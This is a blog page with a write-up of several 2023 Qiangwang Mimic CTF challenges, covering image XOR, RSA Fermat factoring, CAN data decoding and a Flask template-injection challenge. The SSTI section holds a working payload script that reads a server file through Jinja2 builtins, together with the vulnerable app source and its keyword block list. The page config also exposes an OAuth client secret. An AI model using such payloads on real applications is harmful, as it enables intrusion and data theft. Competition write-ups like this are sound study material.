<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="jerem1ah">
    
    <title>
        
            强网拟态2023 部分wp |
        
        Jerem1ah&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/imgs/50ac4ec68298791a5339fb793e82115.jpg">
    
<link rel="stylesheet" href="/fontawesome/css/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/css/regular.min.css">

    
<link rel="stylesheet" href="/fontawesome/css/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/css/brands.min.css">

    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en"};
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/imgs/50ac4ec68298791a5339fb793e82115.jpg","favicon":"/images/imgs/50ac4ec68298791a5339fb793e82115.jpg","avatar":"/images/imgs/50ac4ec68298791a5339fb793e82115.jpg","font_size":null,"font_family":null,"hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"header_transparent":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving.","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":true}},"local_search":{"enable":false,"preload":false},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"side_tools":{},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":true,"use":"gitalk","valine":{"appid":null,"appkey":null,"placeholder":null},"gitalk":{"github_id":"Lejeremiah","github_admins":null,"repository":"gitalk","client_id":"a415960e8a19902e98bf","client_secret":"97151a67ce9c95ad3c333c402f4cee0f5f05020f"},"twikoo":{"env_id":null,"region":null,"version":"1.6.7"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":false,"wordcount":false,"min2read":false},"img_align":"left","copyright_info":false},"version":"3.5.2"};
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"};
  </script>
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="/images/imgs/50ac4ec68298791a5339fb793e82115.jpg">
                </a>
            
            <a class="logo-title" href="/">
               Jerem1ah&#39;s Blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                HOME
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/links"
                            >
                                LINKS
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                ARCHIVES
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                ABOUT
                            </a>
                        </li>
                    
                    
                </ul>
            </div>
            <div class="mobile">
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">HOME</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/links">LINKS</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">ARCHIVES</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">ABOUT</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="post-page-container">
        <div class="article-content-container">

            <div class="article-title">
                <span class="title-hover-animation">强网拟态2023 部分wp</span>
            </div>

            
                <div class="article-header">
                    <div class="avatar">
                        <img src="/images/imgs/50ac4ec68298791a5339fb793e82115.jpg">
                    </div>
                    <div class="info">
                        <div class="author">
                            <span class="name">jerem1ah</span>
                            
                                <span class="author-label">Lv4</span>
                            
                        </div>
                        <div class="meta-info">
                            
<div class="article-meta-info">
    <span class="article-date article-meta-item">
        
            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
        
        <span class="pc">2023-11-15 13:43:30</span>
        <span class="mobile">2023-11-15 13:43</span>
    </span>
    
        <span class="article-update-date article-meta-item">
        <i class="fas fa-file-pen"></i>&nbsp;
        <span class="pc">2024-09-27 10:48:43</span>
    </span>
    
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/ctf/">ctf</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
</div>

                        </div>
                    </div>
                </div>
            

            <div class="article-content keep-markdown-body">
                <h1 id="强网拟态-2023-国际象棋与二维码"><a href="#强网拟态-2023-国际象棋与二维码" class="headerlink" title="[强网拟态 2023] 国际象棋与二维码"></a>[强网拟态 2023] 国际象棋与二维码</h1><p>搞一个49格子的国际象棋棋盘，与原图像异或，这里把原图扩大了49倍，49格的棋盘扩大了500倍，去异或。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">img1 = np.zeros((<span class="number">49</span>,<span class="number">49</span>,<span class="number">3</span>), dtype=np.uint8)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">49</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">49</span>):</span><br><span class="line">        pixel = ((i+j)%<span class="number">2</span>) * <span class="number">255</span></span><br><span class="line">        img1[i,j,:] = [pixel,pixel,pixel]</span><br><span class="line">img1 = np.repeat(img1, <span class="number">500</span>, axis=<span class="number">0</span>)</span><br><span class="line">img1 = np.repeat(img1, <span class="number">500</span>, axis=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># Image.fromarray(img).save(&quot;res1.png&quot;)</span></span><br><span class="line"></span><br><span class="line">img2 = np.array(Image.<span class="built_in">open</span>(<span class="string">&quot;attach.png&quot;</span>).convert(<span class="string">&quot;RGB&quot;</span>))</span><br><span class="line">img2 = np.repeat(img2,<span class="number">49</span>,axis=<span class="number">0</span>)</span><br><span class="line">img2 = np.repeat(img2,<span class="number">49</span>,axis=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># Image.fromarray(img2).save(&quot;res2.png&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># img1 = np.array(Image.open(&quot;res1.png&quot;).convert(&quot;RGB&quot;))</span></span><br><span class="line"><span class="comment"># img2 = np.array(Image.open(&quot;res2.png&quot;).convert(&quot;RGB&quot;))</span></span><br><span class="line"></span><br><span class="line">img3 = img1 ^ img2</span><br><span class="line">Image.fromarray(img3).save(<span class="string">&quot;res3.png&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/38%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812023/image-20231111232528976.png" alt="image-20231111232528976"></p>
<h1 id="强网拟态-2023-用户登记系统"><a href="#强网拟态-2023-用户登记系统" class="headerlink" title="[强网拟态 2023] 用户登记系统"></a>[强网拟态 2023] 用户登记系统</h1><p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://116.63.134.105/index.php&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line"></span><br><span class="line">    paylaod = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;&#123;&#123;c.__init__.__globals__.__builtins__.open(&quot;&quot;.join(c.__init__.__globals__[&quot;__builtins__&quot;].reversed(&quot;galf/pmt/&quot;))).read()[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;]&#125;&#125;&#x27;</span>&#125;</span><br><span class="line">    response = requests.post(url,data=paylaod).text[<span class="number">8</span>]</span><br><span class="line">    <span class="built_in">print</span>(response,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag&#123;u_win_have_fun&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>附上读出来的源码，&amp;符号应该为引号</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, abort, redirect</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">white_list = string.ascii_letters + string.digits + &amp;()_-&#123;&#125;.&amp;[]=/&amp;</span><br><span class="line"><span class="comment">#mimic-defense-31919-heterogeneous</span></span><br><span class="line"><span class="comment">#mimic-defense-29414-heterogeneous</span></span><br><span class="line">black_list = [&amp;codecs&amp;, &amp;system&amp;, &amp;<span class="keyword">for</span>&amp;, &amp;<span class="keyword">if</span>&amp;,</span><br><span class="line">              &amp;end&amp;, &amp;os&amp;, &amp;<span class="built_in">eval</span>&amp;, &amp;request&amp;, &amp;write&amp;,</span><br><span class="line">              &amp;mro&amp;, &amp;<span class="built_in">compile</span>&amp;, &amp;execfile&amp;, &amp;<span class="built_in">exec</span>&amp;,</span><br><span class="line">              &amp;subprocess&amp;, &amp;importlib&amp;, &amp;platform&amp;, &amp;timeit&amp;,</span><br><span class="line">              &amp;<span class="keyword">import</span>&amp;, &amp;linecache&amp;, &amp;module&amp;, &amp;getattribute&amp;,</span><br><span class="line">              &amp;pop&amp;, &amp;getitem&amp;, &amp;decode&amp;, &amp;popen&amp;,</span><br><span class="line">              &amp;ifconfig&amp;, &amp;flag&amp;, &amp;config&amp;, &amp;cat&amp;]</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment">#mimic-defense-94180-heterogeneous</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify_headers</span>(<span class="params">response</span>):</span><br><span class="line">    random_str = [&amp;PHP/<span class="number">7.3</span><span class="number">.33</span>&amp;, &amp;PHP/<span class="number">7.4</span>&amp;, &amp;PHP/<span class="number">7.2</span>&amp;, &amp;PHP/<span class="number">8.2</span>&amp;]</span><br><span class="line">    response.headers[&amp;X-Powered-By&amp;] = random.choice(random_str)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">s</span>):</span><br><span class="line"><span class="comment">#mimic-defense-86550-heterogeneous</span></span><br><span class="line">    <span class="comment"># print(len(s))</span></span><br><span class="line">    <span class="comment"># if len(s) &amp; 131:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s) &amp; <span class="number">478</span>:</span><br><span class="line">        abort(<span class="number">500</span>, &amp;u are hacker&amp;)</span><br><span class="line">        <span class="comment"># abort(500, &amp;hacker len&amp;)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> white_list:</span><br><span class="line">            abort(<span class="number">500</span>, &amp;u are hacker&amp;)</span><br><span class="line">            <span class="comment"># abort(500, &amp;hacker white&amp;)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> s:</span><br><span class="line">            abort(<span class="number">500</span>, &amp;u are hacker&amp;)</span><br><span class="line">            <span class="comment"># abort(500, &amp;hacker black&amp;)</span></span><br><span class="line"><span class="comment">#mimic-defense-26568-heterogeneous</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params">&amp;/&amp;</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redirectIndex</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(&amp;/index.php&amp;, <span class="number">302</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params">&amp;/index.php&amp;, methods=[&amp;GET&amp;, &amp;POST&amp;]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line"><span class="comment">#mimic-defense-7691-heterogeneous</span></span><br><span class="line"><span class="comment">#mimic-defense-50975-heterogeneous</span></span><br><span class="line">    template = &amp;&amp;&amp;</span><br><span class="line">            &amp;h1&amp;用户登记系统&amp;/h1&amp;</span><br><span class="line">            &amp;form method=&amp;POST&amp;&amp;</span><br><span class="line">                &amp;label <span class="keyword">for</span>=&amp;name&amp;&amp;输入用户名称:&amp;/label&amp;</span><br><span class="line">                &amp;<span class="built_in">input</span> <span class="built_in">type</span>=&amp;text&amp; <span class="built_in">id</span>=&amp;name&amp; name=&amp;name&amp;&amp;</span><br><span class="line">                &amp;<span class="built_in">input</span> <span class="built_in">type</span>=&amp;submit&amp; value=&amp;Submit&amp;&amp;</span><br><span class="line">            &amp;/form&amp;</span><br><span class="line"></span><br><span class="line">            &#123;% <span class="keyword">if</span> name %&#125;</span><br><span class="line">                &amp;p&amp;您好, &#123;&#123; name &#125;&#125; 已登记!&amp;/p&amp;</span><br><span class="line">            &#123;% endif %&#125;</span><br><span class="line">        &amp;&amp;&amp;</span><br><span class="line">    <span class="keyword">if</span> request.method == &amp;POST&amp;:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(request.form)</span><br><span class="line">            name = request.form.get(&amp;name&amp;)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;&amp;h1&amp;需要name参数&amp;h1&amp;&amp;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name == &amp;&amp;:</span><br><span class="line"><span class="comment">#mimic-defense-81766-heterogeneous</span></span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;&amp;h1&amp;请输入用户名!&amp;h1&amp;&amp;)</span><br><span class="line"></span><br><span class="line">        check(name)</span><br><span class="line">        template = &amp;&amp;h1&amp;您好, &#123;&#125;已登记!!&amp;h1&amp;&amp;.<span class="built_in">format</span>(name)</span><br><span class="line">        res = render_template_string(template)</span><br><span class="line">        <span class="keyword">if</span> &amp;flag&amp; <span class="keyword">in</span> res:</span><br><span class="line"><span class="comment">#mimic-defense-31218-heterogeneous</span></span><br><span class="line">            abort(<span class="number">500</span>, &amp;u are hacker&amp;)</span><br><span class="line"><span class="comment">#mimic-defense-55651-heterogeneous</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == &amp;__main__&amp;:</span><br><span class="line">    app.run(host=&amp;<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>&amp;, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="强网拟态-2023-find-me-and-crack-me"><a href="#强网拟态-2023-find-me-and-crack-me" class="headerlink" title="[强网拟态 2023] find me and crack me"></a>[强网拟态 2023] find me and crack me</h1><p>上一届原题</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.cmd5.com/" >https://www.cmd5.com/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.mklab.cn/utils/des" >https://www.mklab.cn/utils/des<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="/../images/38%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812023/image-20231111233153499.png" alt="image-20231111233153499"></p>
<p><img src="/../images/38%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812023/image-20231111233209068.png" alt="image-20231111233209068"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.maybe used first url get random:</span><br><span class="line">/mimic_storage</span><br><span class="line"></span><br><span class="line">2.maybe used second url get flag:</span><br><span class="line">/getflag?sec=random&amp;path=xxxx</span><br><span class="line"></span><br><span class="line">xxx is:</span><br><span class="line">MVhuOtClaoE5899iOuiSWkvqxsrRimmb</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web-e5face3ce6.challenge.xctf.org.cn/getflag?sec=1851183404&amp;path=MVhuOtClaoE5899iOuiSWkvqxsrRimmb</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">flag&#123;bWltaWMtQ3RmLVd1SmlhbmdYaW5n&#125;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/38%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812023/image-20231111233316887.png" alt="image-20231111233316887"></p>
<h1 id="强网拟态-2023-Tbox-can"><a href="#强网拟态-2023-Tbox-can" class="headerlink" title="[强网拟态 2023] Tbox can"></a>[强网拟态 2023] Tbox can</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.read_csv(<span class="string">&quot;./can_data.csv&quot;</span>)</span><br><span class="line"></span><br><span class="line">data_columns = df[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data_columns:</span><br><span class="line">    i = <span class="built_in">str</span>(i)</span><br><span class="line">    <span class="keyword">if</span> i[:<span class="number">2</span>] == <span class="string">&#x27;0x&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i,<span class="number">16</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag&#123;L0QGIC_ANAR1YSIS_CSAN_FOR_TFUN&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="强网拟态-2023-一眼看出"><a href="#强网拟态-2023-一眼看出" class="headerlink" title="[强网拟态 2023] 一眼看出"></a>[强网拟态 2023] 一眼看出</h1><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/hacker_zrq/article/details/121444869" >https://blog.csdn.net/hacker_zrq/article/details/121444869<i class="fas fa-external-link-alt"></i></a> &#x2F;&#x2F;费马分解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">flag=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">r = getPrime(<span class="number">6</span>)</span><br><span class="line">a = <span class="number">11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699</span></span><br><span class="line">p = gmpy2.next_prime(a - r)</span><br><span class="line">q = gmpy2.next_prime(gmpy2.next_prime(a) + r)</span><br><span class="line">n = p*q</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">flag, n</span>):</span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(m, <span class="number">65537</span>, n)</span><br><span class="line">c = enc(flag, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br><span class="line"><span class="comment"># (&#x27;n =&#x27;, mpz(121027298948349995679677982412648544403333177260975245569073983061538581058440163574922807151182889153495253964764966037308461724272151584478723275142858008261257709817963330011376266261119767294949088397671360123321149414700981035517299807126625758046100840667081332434968770862731073693976604061597575813313L))</span></span><br><span class="line"><span class="comment"># (&#x27;c =&#x27;, mpz(42256117129723577554705402387775886393426604555611637074394963219097781224776058009003521565944180241032100329456702310737369381890041336312084091995865560402681403775751012856436207938771611177592600423563671217656908392901713661029126149486651409531213711103407037959788587839729511719756709763927616470267L))</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">121027298948349995679677982412648544403333177260975245569073983061538581058440163574922807151182889153495253964764966037308461724272151584478723275142858008261257709817963330011376266261119767294949088397671360123321149414700981035517299807126625758046100840667081332434968770862731073693976604061597575813313</span></span><br><span class="line">c = <span class="number">42256117129723577554705402387775886393426604555611637074394963219097781224776058009003521565944180241032100329456702310737369381890041336312084091995865560402681403775751012856436207938771611177592600423563671217656908392901713661029126149486651409531213711103407037959788587839729511719756709763927616470267</span></span><br><span class="line">a = gmpy2.iroot(n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    b1 = <span class="built_in">pow</span>(a,<span class="number">2</span>) - n</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    <span class="keyword">if</span> gmpy2.is_square(b1):</span><br><span class="line">        b = gmpy2.iroot(b1,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">        q = a+b</span><br><span class="line">        p = a-b</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    a = a + <span class="number">1</span></span><br><span class="line">fi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = gmpy2.invert(e,fi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">m = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;flag&#123;621f7c4f-21de-8566-649e-5a883ce318dc&#125;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>


            </div>

            

            
                <ul class="post-tags-box">
                    
                        <li class="tag-item">
                            <a href="/tags/ctf/">#ctf</a>&nbsp;
                        </li>
                    
                </ul>
            

            
                <div class="article-nav">
                    
                        <div class="article-prev">
                            <a class="prev"
                               rel="prev"
                               href="/2023/11/22/39%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/"
                            >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                                <span class="title flex-center">
                                <span class="post-nav-title-item">春秋云镜：Initial</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                            </a>
                        </div>
                    
                    
                        <div class="article-next">
                            <a class="next"
                               rel="next"
                               href="/2023/11/09/37ACTF2023/"
                            >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">ACTF2023 web部分</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                                <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                            </a>
                        </div>
                    
                </div>
            

            
                <div class="comment-container">
                    
<div class="comments-container">
    <div id="comments-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments"></i>&nbsp;Comments
    </div>
    
        
            

    <div class="gitalk-comment-container">
        <div id="gitalk-container"></div>
        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.css">
        <script  src="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js"></script>
        <script >
          function loadGitalk() {
            let __gitalk__pathname = decodeURI(location.pathname);
            const __gitalk__pathnameLength = __gitalk__pathname.length;
            const __gitalk__pathnameMaxLength = 50;
            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
              __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
            }

            try {
              Gitalk && new Gitalk({
                clientID: 'a415960e8a19902e98bf',
                clientSecret: '97151a67ce9c95ad3c333c402f4cee0f5f05020f',
                repo: 'gitalk',
                owner: 'Lejeremiah',
                admin: 'Lejeremiah',
                id: __gitalk__pathname,
                language: 'en'
              }).render('gitalk-container');
            } catch (e) {
              window.Gitalk = null;
            }
          }

          if ('false' === 'true') {
